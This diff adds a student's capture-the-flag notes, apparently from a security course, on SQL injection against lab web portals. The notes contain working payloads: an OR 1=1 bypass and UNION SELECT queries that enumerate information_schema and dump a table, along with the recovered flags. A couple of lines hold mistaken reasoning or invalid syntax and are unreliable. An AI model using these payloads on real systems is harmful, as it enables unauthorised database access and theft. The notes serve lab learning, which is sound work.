@@ -1,0 +1,37 @@
+SELECT * FROM db WHERE something = "%query%";
+
+SELECT * FROM db WHERE something = "%" OR 1=1 -- test%";
+
+Payportal 1: enetered a " and got a SQL error
+then entered " OR 1 = 1 -- test and returned everything which included the flag
+COMP6443{SQLiIsPowerful}
+
+
+Next tried 
+"UNION SELECT 1,1,1,1,1,1,1,1 -- test
+which worked.
+
+Now try dumping schema
+information_schema.tables
+"UNION SELECT 1,1,1,1,1,1,1,table_name FROM information_schema.tables-- test
+showed list of all tables.
+
+upcoming_layoffs - is a table
+
+"UNION SELECT 1,1,1,1,1,1,1,COUNT(*) FROM upcoming_layoffs-- test
+
+There is 1 column
+
+"UNION SELECT 1,1,1,1,1,1,1,SELECT(*) FROM upcoming_layoffs-- test
+
+"UNION SELECT 1,1,1,1,1,1,1,column_name  FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'upcoming_layoffs' -- test
+
+Found 
+date
+id
+reason
+staff_id
+
+"UNION SELECT 1,1,1,1,date,id,reason,staff_id  FROM upcoming_layoffs -- test
+
+COMP6443{oh_no_im_getting_fired}
